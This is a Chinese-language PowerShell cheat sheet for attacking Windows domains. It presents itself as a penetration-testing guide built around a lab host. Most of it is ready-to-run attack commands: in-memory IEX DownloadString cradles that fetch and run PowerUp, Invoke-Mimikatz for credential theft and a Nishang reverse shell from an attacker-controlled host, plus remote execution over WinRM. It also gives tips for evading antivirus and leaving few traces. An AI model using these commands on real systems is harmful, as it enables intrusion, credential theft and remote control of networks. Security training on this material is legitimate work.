# Powershell
这篇文章主要收录了通过域枚举域，反弹shell，内网穿透和运行exp来获取进一步的访问权限的技术。Powershell在现代Windows系统中的流行对我们有很大的帮助。我们可以综合利用这些tricks，在留下很少的记录的同时，完成高效和隐蔽的攻击。Powershell可以不在硬盘上创建文件的同时直接操作内存。BOX01是本文的实验环境，10.10.10.10是本机ip。如果需要从kali上下载文件，可以简单的使用 
`python -m SimpleHTTPServer 80` 来实现。

在这里，在服务器端使用身份认证和https进行网络安全控制是很明智的。

此处大部分技巧可以由一个人独自完成。

---

## 下载和上传文件
下载文件到目标主机有时候是可行的，但是不要忘记，当你想不被发现或者绕过杀毒软件的时候，Powershell是可以远程或者在内存中做到这些。

下面这句命令将下载此文件到当前目录，运行这些命令不需要一个交互的Powershell，他们可以直接在cmd中执行。
```Powershell
Powershell.exe -nop -exec bypass -c "IEX (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10/file.txt');"
```
这句命令可以下载文件到指定目录，并且可以在`DownloadFile`函数中的第二个参数中指定文件名。
```Powershell
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadFile('http://10.10.10.10/PowerView.ps1','C:\tmp\PowerView.ps1');"
```

## BloodHound
BloodHound是一个能映射出整个域的结构图的工具。
```Powershell
Powershell -exec bypass
Import-module sharphound.ps1Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing
```
## 远程
一旦获得一个域用户的权限，在远端可以做很多事情。在AD(Active Directory)中，只需要获得一个shell就可以。一旦获得获得一个域用户的权限，你可以通过在该节点上的域或本地权限，在很多节点上执行大量的命令。windows提供三种方法进行访问认证：凭证，哈希和令牌。下面我们来介绍这些访问类型的区别。

如果可以访问一台主机的文件共享，假设你已经获得你想要的用户的shell，不曾输入密码，你就可以在目录下使用`dir`命令。这意味着即使你获得一个没有hash和凭证的shell，你仍然可以使用令牌向远程服务来辨识你的身份。使用如下命令来简单验证下：
```Powershell
dir \\BOX01\c$\
```
如果你没有shell，但是有域用户的凭证，你可以使用`runas`命令，这将要求你输入密码，但是你可以在自己的机器上运行而不需要一个远程shell。

`/netonly` 表示指定的用户信息只能用于远程访问。
```Powershell
runas /netonly /FQDN\user cmd.exe
```
运行如下命令，可以从远程计算机上运行并获得Powershell。

```Powershell
runas /netonly /user:customer\ank powershell
```
使用`WMIC`，检查哪些用户在远程计算机上有会话。远程运行这个命令时不需要本地管理员权限。

```Powershell
wmic /node:box01.lab.local path win32_loggedonuser get antecedent
```

Powershell原生支持WinRM，WinRM允许远程执行命令。以下命令展示如何在当前用户仅能访问令牌(tokens)的情况下在远程计算机上执行命令（不要求输入密码）。这个`{hostname}`命令只是用于验证shell有没有用，也可以换成其他命令。

```Powershell
Invoke-Command -ComputerName BOX01 -Scriptblock {hostname}
```

更进一步，你可以在Powershell中设置凭证。使用Empire中类似`ps_remoting`的功能可以实现这些。
```Powershell
$username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential -ScriptBlock {hostname};
```

## Powerview
Powerview 是一个用于域枚举的工具集，这是更大的工具集Powerspolit的一部分，其开发规模巨大，所以随时都在变。Powerview完整的命令列表可以在一下目录找到：

<https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon>

Powerviewk可能被反病毒软件拦截，可以看看这篇有意思的文章了解如何“绕过”它。该方法在2018年一个真实环境中起到了作用。<https://implicitdeny.org/2016/03/powerview-caught-by-sep/>

在Powerview中有一个特别实用的功能叫做`Find-LocalAdminAccess`,它可以枚举出目前的用户在哪些机器上是管理员权限。这是非常实用的，因为你可以在那些计算机上运行一些类似mimikatz的工具，直接进入内存，从而获得域用户凭证。如果你需要看看在当前环境中的每一台计算机，哪些组和用户是本地管理员，你可以使用`Invoke-EnumerateLocalAdmin`。

如果你开心的话，可以把所有模块都运行一遍。

打开PowerUp.ps1，在文件的末尾添加`Invoke-AllChecks`，这将在使powershell脚本字符串在下载完成之后再接在内存中执行此脚本。这中方法对Powershell中的每个函数都是有效的。

```Powershell
Powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”
```
## Mimikatz
和Powerview类似，在ps1文件的最后一行说明你要执行的命令，客户端中将实时显示结果。

```Powershell
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
```

## Shells
恕我直言，Ninshang shells就跟坨屎。<https://github.com/samratashok/nishang/tree/master/Shells>

```Powershell
Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"
```

我们可以使用WinRM实现相同的功能。
```Powershell
Invoke-Command -ComputerName BOX01 -Scriptblock {Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClien
t).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"}
```

也应该考虑使用https反弹shell以防止被检测到。

## Invoke-Kerberoast

Kerberoast 是一种技术。

<https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/>

<https://room362.com/post/2016/kerberoast-pt1/>
